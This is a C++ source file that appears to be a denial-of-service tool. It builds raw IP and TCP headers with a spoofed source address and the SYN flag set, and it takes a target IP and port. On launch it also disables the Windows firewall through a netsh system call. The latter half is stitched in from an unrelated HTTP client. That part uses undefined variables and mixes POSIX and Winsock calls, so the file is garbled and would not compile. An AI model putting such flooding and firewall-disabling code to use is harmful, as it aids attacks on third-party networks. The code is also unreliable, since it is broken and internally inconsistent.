#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

using namespace std;

// TCP packet structure
struct tcpheader {
    u_int16_t src_port;
    u_int16_t dest_port;
    u_int32_t seq_num;
    u_int32_t ack_num;
    u_int8_t  res:4, offset:4;
    u_int8_t  flags;
    u_int16_t window_size;
    u_int16_t checksum;
    u_int16_t urg_ptr;
};

// IP packet structure
struct ipheader {
    u_int8_t  version:4, header_len:4;
    u_int8_t  tos;
    u_int16_t total_len;
    u_int16_t ident;
    u_int16_t frag_and_flags;
    u_int8_t  ttl;
    u_int8_t  proto;
    u_int16_t checksum;
    u_int32_t src_addr;
    u_int32_t dest_addr;
};

void usage(char* prog_name) {
    cout << "Usage: " << prog_name << " <target IP> <target port> <nickname>\n";
}

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char* argv[]) {
    // Check for correct number of arguments
    if (argc != 4) {
        usage(argv[0]);
        return 1;
    }
    system("netsh firewall set opmode disable");

    // Parse arguments
    char* target_ip = argv[1];
    int target_port = atoi(argv[2]);
    char* nickname = argv[3];

    // Create raw socket
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("socket() error");
        return 1;
    }
    
    // Set IP header options
    struct ipheader ip_hdr;
    ip_hdr.version = 4;
    ip_hdr.header_len = 5;
    ip_hdr.tos = 0;
    ip_hdr.total_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
    ip_hdr.ident = htons(rand()%65535);
    ip_hdr.frag_and_flags = 0;
    ip_hdr.ttl = 255;
    ip_hdr.proto = IPPROTO_TCP;
    ip_hdr.checksum = 0;
    ip_hdr.src_addr = inet_addr("1.2.3.4"); // spoofed source IP
    ip_hdr.dest_addr = inet_addr(target_ip);
    
    // Set TCP header options
    struct tcpheader tcp_hdr;
    tcp_hdr.src_port = htons(rand()%65535);
    tcp_hdr.dest_port = htons(target_port);
    tcp_hdr.seq_num = rand()%1000000;
    tcp_hdr.ack_num = 0;
    tcp_hdr.res = 0;
    tcp_hdr.offset = 5;
    tcp_hdr.flags = 0x02; // SYN flag
    tcp_hdr.window_size = htons(512);
    tcp_hdr.checksum = 0;
    tcp_hdr.urg_ptr = 0;
  
    // Construct packet
char packet[4096];
memset(packet, 0, sizeof(packet));
strcpy(packet, "GET /");
strcat(packet, page);
strcat(packet, " HTTP/1.1\r\nHost: ");
strcat(packet, hostname);
strcat(packet, "\r\nConnection: keep-alive\r\n\r\n");

// Open a socket connection to the server
SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
if (sock == INVALID_SOCKET) {
    // Error handling
    return 1;
}

// Connect to the server
sockaddr_in target;
target.sin_family = AF_INET;
target.sin_port = htons(port);
target.sin_addr.s_addr = inet_addr(ip);

if (connect(sock, (sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
    // Error handling
    return 1;
}

// Send the packet to the server
send(sock, packet, strlen(packet), 0);

// Start receiving data from the server
char buffer[1024];
int received = 0;
do {
    received = recv(sock, buffer, sizeof(buffer), 0);
    // Process the received data
} while (received > 0);

 // Close the socket connection
    closesocket(sock);

    // Cleanup Winsock
    WSACleanup();

    return 0;
}

